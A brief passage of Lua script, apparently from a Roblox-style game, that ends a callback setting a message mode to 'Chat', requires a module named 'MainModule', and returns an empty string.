	require("MessageModes"):Set("Chat")
end)

require("MainModule")

return ""
